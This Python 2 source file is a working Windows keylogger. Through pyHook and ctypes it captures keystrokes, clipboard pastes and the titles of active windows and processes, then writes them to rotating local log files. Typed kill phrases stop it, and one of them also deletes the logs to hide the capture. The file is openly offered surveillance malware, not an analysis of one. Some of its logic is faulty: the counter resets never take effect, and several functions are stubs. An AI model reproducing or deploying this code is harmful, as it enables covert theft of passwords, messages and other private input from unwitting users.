from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import os
import shutil
from time import gmtime, strftime

#Keylogger Vars
user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

#Filewrite Vars
filename_base = "x"
filename_ext  = ".log"
open_type = 'a+'
filesize_limit = 500000 #Bytes
paste_limit = 500 #chars

#CheckQuit Vars
quit_pass = "zwagquit"
quit_pass_counter = 0


#CheckKill Vars
kill_pass = "zwagkill"
kill_pass_counter = 0




def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    print "\n"
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print "\n"
  
    #Write
    writeToFile("\n")
    writeToFile("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    writeToFile("\n")

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):

    global current_window   

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
        checkTriggers(chr(event.Ascii))
        writeToFile(chr(event.Ascii))
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if (len(pasted_value) < paste_limit):
                print "[PASTE] - %s" % (pasted_value),
                writeToFile("[PASTE] - %s" % (pasted_value))
        else:
            print "[%s]" % event.Key,
            writeToFile("[%s]" % event.Key)

    # pass execution to next hook registered 
    return True

def checkTriggers(key):
    quitSwitch(key)
    killSwitch(key)
    pauseSwitch(key)
    resumeSwitch(key)

def quitSwitch(key):
    global quit_pass_counter

    if (quit_pass[quit_pass_counter] == key):
        quit_pass_counter = quit_pass_counter + 1
        if (quit_pass_counter >= len(quit_pass)):
            quit()
    else:
        pass_counter = 0;

def killSwitch(key):
    global kill_pass_counter

    if (kill_pass[kill_pass_counter] == key):
        kill_pass_counter = kill_pass_counter + 1
        if (kill_pass_counter >= len(kill_pass)):

            filelist = [ f for f in os.listdir(".") if f.endswith(".log") ]
            for f in filelist:
                os.remove(f)
            #os.remove("yourfile.py")
            quit()
    else:
        pass_counter = 0;

def pauseSwitch(key):
    i = "TODO"

def resumeSwitch(key):
    i = "TODO"

def statusSwitch(key):
    i = "TODO"

def dumpSwitch(key):
    i = "TODO"

#ENCRYPTION

def writeToFile(key):
    global open_type
    filename = filename_base+filename_ext

    try:
        if (os.path.getsize(filename) > filesize_limit):
            xdate = strftime("%Y-%m-%d--%H-%M-%S", gmtime())
            shutil.copy2(filename, filename_base+xdate+filename_ext)
            open_type = 'w+'
            print "SET"
        else:
            open_type = 'a+'
    except:
        open_type = 'a+'

    print "A",open_type
    target = open(filename,open_type)
    target.write(key)
    target.close();




# create and register a hook manager 
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
